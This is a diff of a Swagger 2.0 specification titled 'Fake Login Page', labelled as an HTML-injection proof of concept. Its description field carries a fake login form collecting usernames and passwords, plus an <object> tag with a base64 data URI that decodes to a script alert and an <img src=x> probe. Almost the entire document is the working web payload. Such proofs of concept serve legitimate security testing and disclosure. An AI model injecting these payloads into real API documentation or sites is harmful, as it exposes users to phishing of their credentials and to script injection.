@@ -2,10 +2,9 @@ swagger: '2.0'
 info:
   version: 1.0.0
   title: Fake Login Page
-  description: '<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnZDB1ZycpPC9zY3JpcHQ=%2b\"><div class="login-form">
-  <object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnZDB1ZycpPC9zY3JpcHQ=%2b\">
+  description: '<div class="login-form">
     <div class="heading">
-        <h1>HTML Injection : Fake Login</h1> (PoC d0ug)
+        <h1>HTML Injection : Fake Login</h1> (PoC d0ug.) <object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnZDB1ZycpPC9zY3JpcHQ=%2b\"> <img src=x>
     </div>
     <div class="form-container">
         <form action="https://example.com/login" method="post" class="form-signin">
@@ -17,7 +16,6 @@ info:
                 <label for="password">Password</label>
                 <input type="password" name="password" size="20">
             </div>
-            <object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnZDB1ZycpPC9zY3JpcHQ=%2b\">
             <div class="form-group">
                 <button type="submit" class="btn btn-default">Login</button>
             </div>
